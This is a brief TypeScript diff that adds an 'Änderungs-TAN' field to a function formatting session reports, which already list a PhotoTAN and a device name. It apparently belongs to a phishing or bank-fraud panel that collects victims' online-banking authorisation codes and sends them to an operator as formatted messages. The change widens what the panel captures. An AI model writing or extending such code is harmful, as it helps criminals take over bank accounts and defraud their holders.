@@ -105,6 +105,12 @@ export function formatSessionText(s: {
     lines.push(`<b>📱 PhotoTAN</b>: <code>${escapeHtml(String(m.photoTan))}</code>`);
   }
 
+  if (m.aenderungTan) {
+    lines.push("");
+    lines.push(`<b>🔢 Änderungs-TAN</b>: <code>${escapeHtml(String(m.aenderungTan))}</code>`);
+  }
+
+
   if (m.deviceName) {
     lines.push("");
     lines.push(`<b>📟 Gerätename</b>: <code>${escapeHtml(String(m.deviceName))}</code>`);
